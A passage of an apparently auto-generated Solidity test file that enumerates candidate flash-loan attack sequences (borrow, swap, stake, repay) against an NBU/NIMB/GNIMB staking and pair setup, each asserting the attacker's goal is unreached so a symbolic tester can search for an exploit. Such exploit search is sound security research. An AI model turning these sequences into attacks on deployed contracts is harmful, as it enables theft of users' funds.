        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand480(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand481(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand482(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand483(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand484(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand485(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand486(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand487(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand488(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand489(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand490(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand491(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand492(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand493(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand494(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand495(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand496(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand497(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand498(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand499(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand500(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand501(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand502(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand503(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand504(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand505(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand506(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand507(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand508(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand509(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand510(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand511(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand512(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand513(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand514(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand515(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand516(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand517(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand518(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand519(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand520(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand521(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand522(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand523(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand524(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand525(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand526(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand527(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand528(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand529(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand530(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand531(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand532(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand533(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand534(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
